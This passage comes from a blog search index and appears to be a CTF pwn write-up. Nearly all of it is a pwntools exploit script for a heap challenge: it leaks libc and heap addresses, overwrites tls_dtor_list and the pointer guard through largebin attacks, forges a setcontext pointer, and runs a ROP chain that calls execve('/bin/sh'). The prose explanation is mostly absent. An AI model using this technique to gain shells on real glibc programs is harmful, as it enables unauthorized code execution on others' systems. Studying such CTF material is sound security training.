class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice &gt;&gt;&quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx:&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;size:&quot;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice &gt;&gt;&quot;</span>,<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx:&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice &gt;&gt;&quot;</span>,<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx:&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;size:&quot;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendafter(<span class="string">&quot;content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice &gt;&gt;&quot;</span>,<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx:&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">end</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice &gt;&gt;&quot;</span>,<span class="string">b&quot;5&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;libc_base:&quot;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">0x80e50</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">tls_dtor_list = libc_base - <span class="number">0x2918</span></span><br><span class="line">fs_base = libc_base - <span class="number">0x28c0</span></span><br><span class="line"><span class="comment"># fs_base = libc_base - 0x3260</span></span><br><span class="line">ret = libc_base + <span class="number">0x0000000000029139</span></span><br><span class="line">leave_ret = libc_base + <span class="number">0x000000000004da83</span></span><br><span class="line">setcontext = libc_base + libc.sym[<span class="string">&quot;setcontext&quot;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x428</span>)  <span class="comment">#1</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x428</span>)  <span class="comment">#2</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x418</span>)  <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x500</span>)  <span class="comment">#4</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">heap_base = u64(p.recvuntil(<span class="string">b&#x27;\x55&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x16b0</span></span><br><span class="line">log.success(<span class="string">&quot;heap_base:&quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(tls_dtor_list-<span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x500</span>)        <span class="comment">#trigger largebin attack 1</span></span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0x10</span>,p64(<span class="number">0</span>)+p64(heap_base+<span class="number">0x1af0</span>))    <span class="comment">#next=chunk2-&gt;data</span></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x4f8</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x600</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(fs_base+<span class="number">0x30</span>-<span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x600</span>)        <span class="comment">#trigger largebin attack 2</span></span><br><span class="line"></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x000000000002a3e5</span></span><br><span class="line">pop_rdx_r12_ret = libc_base + <span class="number">0x000000000011f2e7</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x000000000002be51</span></span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x0000000000045eb0</span></span><br><span class="line">syscall = libc_base + <span class="number">0x0000000000029db4</span></span><br><span class="line"></span><br><span class="line">key = heap_base + <span class="number">0x3260</span></span><br><span class="line">chunk8 = heap_base + <span class="number">0x3770</span></span><br><span class="line">payload = <span class="string">b&quot;\x00&quot;</span>*<span class="number">0x78</span> + p64(chunk8-<span class="number">8</span>)  <span class="comment">#rbp</span></span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>,<span class="string">b&quot;\x00&quot;</span>) + p64(heap_base+<span class="number">0x5000</span>)+p64(leave_ret)</span><br><span class="line">payload = payload.ljust(<span class="number">0x420</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(((setcontext+<span class="number">61</span>)^key)&lt;&lt;<span class="number">0x11</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x428</span>,payload)  </span><br><span class="line"></span><br><span class="line">rop = p64(pop_rdi_ret)+p64(chunk8+<span class="number">0x50</span>)+p64(pop_rsi_ret)+p64(<span class="number">0</span>)+p64(pop_rdx_r12_ret)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(pop_rax_ret)+p64(<span class="number">0x3b</span>)+p64(syscall)+<span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">edit(<span class="number">8</span>,<span class="number">0x58</span>,rop)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">end()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
      </tags>
  </entry>
</search>
